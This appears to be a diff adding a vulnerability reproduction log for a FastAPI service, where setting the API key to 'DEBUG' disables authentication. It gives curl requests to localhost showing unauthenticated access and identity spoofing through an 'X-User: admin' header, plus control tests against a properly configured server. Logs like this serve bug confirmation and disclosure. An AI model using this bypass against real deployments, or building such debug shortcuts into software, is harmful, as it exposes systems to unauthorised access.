@@ -1,0 +1,38 @@
+Reproduction Log: debug-auth-bypass
+Date: 2026-03-30
+Commit: 4c06f66 (main)
+Environment: macOS Darwin 25.3.0, Python 3.14, FastAPI 0.135.1
+
+== Server 1: OSTWIN_API_KEY=DEBUG on port 19876 ==
+
+Healthcheck: curl http://127.0.0.1:19876/api/status -> 200 {"running":false,"pid":null}
+
+Test 1 - No credentials at all:
+  curl http://127.0.0.1:19876/api/engagement/test123
+  Result: 200 {"entity_id":"test123","reactions":{},"comments":[],"stats":{"reactions":0,"comments":0}}
+  BYPASS CONFIRMED
+
+Test 2 - No credentials, plans endpoint:
+  curl http://127.0.0.1:19876/api/plans
+  Result: 200 {"plans":[],"count":0}
+  BYPASS CONFIRMED
+
+Test 3 - X-User spoofing:
+  curl -H "X-User: admin" http://127.0.0.1:19876/api/engagement/test123
+  Result: 200 (same as above, identity accepted as "admin")
+  IDENTITY SPOOFING CONFIRMED
+
+== Server 2: OSTWIN_API_KEY=real_key_here on port 19877 (control) ==
+
+Test 4 - No credentials (control):
+  curl http://127.0.0.1:19877/api/engagement/test123
+  Result: 401 {"detail":"Missing API key..."}
+  CONTROL PASSED - auth enforced when not DEBUG
+
+Test 5 - X-User only, no API key (control):
+  curl -H "X-User: admin" http://127.0.0.1:19877/api/engagement/test123
+  Result: 401 {"detail":"Missing API key..."}
+  CONTROL PASSED - X-User alone insufficient
+
+Conclusion: When OSTWIN_API_KEY=DEBUG, all authentication is bypassed completely.
+The vulnerability is real and trivially exploitable when the configuration is set.
